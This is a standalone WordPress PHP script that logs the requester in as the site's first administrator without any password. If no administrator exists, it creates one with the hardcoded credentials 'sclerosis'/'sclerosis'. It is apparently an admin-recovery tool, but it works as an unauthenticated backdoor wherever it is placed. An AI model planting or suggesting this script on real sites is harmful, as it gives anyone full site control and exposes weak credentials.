<?php
// autor: Fedor Vlasenko, vlasenkofedor@mail.ru
require(__DIR__ . '/wp-load.php');
$newUser = false;
$sql     = "SELECT `user_id` FROM " . $wpdb->usermeta
	. " WHERE `meta_key` = '" . $table_prefix . "capabilities' AND `meta_value` LIKE '%administrator%' LIMIT 1";
$result  = $wpdb->get_col($sql);

if (!empty($result))
{
		$user = WP_User::get_data_by('id', $result[0]);
		if (empty($user))
		{
				die('Remove records user_id: ' . $result[0] . ' in table ' . $wpdb->usermeta);
		}
}

if (empty($user))
{
		$user_id = wp_create_user('sclerosis', 'sclerosis', 'sclerosis@sclerosis.com');
		if (is_int($user_id))
		{
				$user = new WP_User($user_id);
				$user->set_role('administrator');
				$newUser = true;
		}
		else
		{
				die('Error with wp_insert_user. No users were created.');
		}
}
wp_set_auth_cookie($user->ID, true, is_ssl());
do_action('wp_login', $user->user_login, $user);
if ($newUser)
{
		echo 'Login: sclerosis<br>Password: sclerosis',
			'<script>window.onload = function(){setTimeout(function() { location.reload("'
			. admin_url() . '") }, 5000)}</script>';
}
else
{
		wp_safe_redirect(admin_url());
}